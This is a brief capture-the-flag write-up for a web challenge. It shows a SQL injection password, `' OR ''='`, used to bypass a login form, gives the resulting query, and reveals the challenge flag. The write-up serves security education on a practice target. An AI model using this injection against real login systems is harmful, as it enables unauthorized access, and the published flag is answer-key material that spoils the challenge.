# web / web1

> Points: 1203

## Question


> [ctf.csclub.uwaterloo.ca/web/2](ctf.csclub.uwaterloo.ca/web/2/)

## Solution

Clicking the link takes us to an authentication form like the last challenge. But this time, the site has a filter for comments. We use SQL injection to bypass the authentication.
We put the password as `' OR ''='`. Now the SQL query looks like:

```sql
SELECT * FROM users where username = '' and password = '' OR ''=''
```

With this, the site outputs the flag for us.

### Flag

`uwctf{c949fc531c40620b}`